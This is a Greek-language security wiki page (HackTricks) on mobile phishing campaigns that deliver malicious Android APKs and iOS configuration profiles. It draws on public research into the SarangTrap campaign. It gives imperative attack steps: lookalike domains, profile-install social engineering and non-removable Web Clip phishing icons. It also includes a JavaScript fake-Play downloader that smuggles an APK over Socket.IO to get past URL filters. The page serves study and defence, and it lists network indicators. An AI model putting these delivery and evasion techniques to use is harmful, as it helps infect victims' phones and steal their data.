# Phishing μέσω κινητών συσκευών & διανομή κακόβουλων εφαρμογών (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Αυτή η σελίδα καλύπτει τεχνικές που χρησιμοποιούν απειλητικοί παράγοντες για τη διανομή **κακόβουλων Android APK** και **προφίλ διαμόρφωσης iOS** μέσω phishing (SEO, social engineering, ψεύτικα καταστήματα, εφαρμογές γνωριμιών κ.λπ.).
> Το υλικό βασίζεται στην καμπάνια SarangTrap, την οποία αποκάλυψε η Zimperium zLabs (2025), καθώς και σε άλλες δημόσιες έρευνες.<sup>[[1]](#references)</sup>

## Ροή επίθεσης

1. **Υποδομή SEO/Phishing**
   * Καταχωρίστε δεκάδες παρεμφερή domains (γνωριμίες, διαμοιρασμός στο cloud, υπηρεσία αυτοκινήτου…).
     – Χρησιμοποιήστε λέξεις-κλειδιά στην τοπική γλώσσα και emoji στο στοιχείο `<title>` για καλύτερη κατάταξη στο Google.
     – Φιλοξενήστε *τόσο* το Android (`.apk`) *όσο και* οδηγίες εγκατάστασης iOS στην ίδια σελίδα προορισμού.
2. **Λήψη πρώτου σταδίου**
   * Android: απευθείας σύνδεσμος προς ένα *unsigned* APK ή APK από «κατάστημα τρίτου μέρους».
   * iOS: σύνδεσμος `itms-services://` ή απλός σύνδεσμος HTTPS προς κακόβουλο προφίλ **mobileconfig** (βλ. παρακάτω).
3. **Συμπεριφορά Android μετά την εγκατάσταση**
   * Η εκτέλεση με έλεγχο C2, η κατάχρηση δικαιωμάτων, οι παρακάμψεις dropper, η συλλογή δεδομένων στο παρασκήνιο και άλλες συμπεριφορές malware μετά την εγκατάσταση καλύπτονται στην ειδική σελίδα Android Malware Post-Exploitation παρακάτω.
4. **Τεχνική παράδοσης iOS**
   * Ένα μόνο **προφίλ διαμόρφωσης κινητής συσκευής** μπορεί να ζητήσει `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` κ.λπ., για να εντάξει τη συσκευή σε εποπτεία τύπου «MDM».
   * Οδηγίες social engineering:
     1. Ανοίξτε τις Ρυθμίσεις ➜ *Λήψη προφίλ*.
     2. Πατήστε *Εγκατάσταση* τρεις φορές (με στιγμιότυπα οθόνης στη σελίδα phishing).
     3. Εμπιστευτείτε το unsigned προφίλ ➜ ο attacker αποκτά δικαιώματα *Επαφών* και *Φωτογραφιών* χωρίς έλεγχο από το App Store.
5. **Payload Web Clip iOS (εικονίδιο εφαρμογής phishing)**
   * Τα payload `com.apple.webClip.managed` μπορούν να **καρφιτσώσουν ένα URL phishing στην Αρχική οθόνη** με επώνυμο εικονίδιο/ετικέτα.
   * Τα Web Clip μπορούν να εκτελούνται **σε πλήρη οθόνη** (αποκρύπτουν το UI του browser) και να οριστούν ως **μη αφαιρούμενα**, αναγκάζοντας το θύμα να διαγράψει το προφίλ για να αφαιρέσει το εικονίδιο.<sup>[[3]](#references)</sup>
6. **Επίπεδο δικτύου**
   * Απλό HTTP, συχνά στη θύρα 80, με κεφαλίδα HOST όπως `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (χωρίς TLS → εύκολο να εντοπιστεί).

## Android Malware Post-Exploitation

Για τεχνικές Android malware μετά την εγκατάσταση, όπως C2, κατάχρηση Accessibility, overlays, αυτοματοποίηση ATS, φόρτωση staged DEX, SMS υψηλής χρέωσης και persistence, δείτε:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Smuggling APK μέσω Socket.IO/WebSocket + ψεύτικες σελίδες Google Play

Οι attackers αντικαθιστούν όλο και συχνότερα τους στατικούς συνδέσμους APK με κανάλι Socket.IO/WebSocket ενσωματωμένο σε παραπλανητικές σελίδες που μοιάζουν με το Google Play. Έτσι αποκρύπτεται το URL του payload, παρακάμπτονται τα φίλτρα URL/επέκτασης και διατηρείται μια ρεαλιστική εμπειρία εγκατάστασης.<sup>[[2]](#references)[[4]](#references)</sup>

Τυπική ροή client που έχει παρατηρηθεί στην πράξη:

<details>
<summary>Ψεύτικο downloader του Play μέσω Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Γιατί παρακάμπτει τους απλούς ελέγχους:
- Δεν εκτίθεται στατικό URL APK· το payload ανασυντίθεται στη μνήμη από frames WebSocket.
- Τα φίλτρα URL/MIME/επέκτασης που αποκλείουν άμεσες αποκρίσεις .apk ενδέχεται να μην εντοπίσουν δυαδικά δεδομένα που διοχετεύονται μέσω WebSockets/Socket.IO.
- Τα crawlers και τα URL sandboxes που δεν εκτελούν WebSockets δεν θα ανακτήσουν το payload.

Δείτε επίσης το WebSocket tradecraft και τα εργαλεία:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Η σκοτεινή πλευρά του ρομαντισμού: Εκστρατεία εκβιασμού SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Ρυθμίσεις payload Web Clips για συσκευές Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker Trojan που στοχεύει χρήστες Android στην Ινδονησία και το Βιετνάμ](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
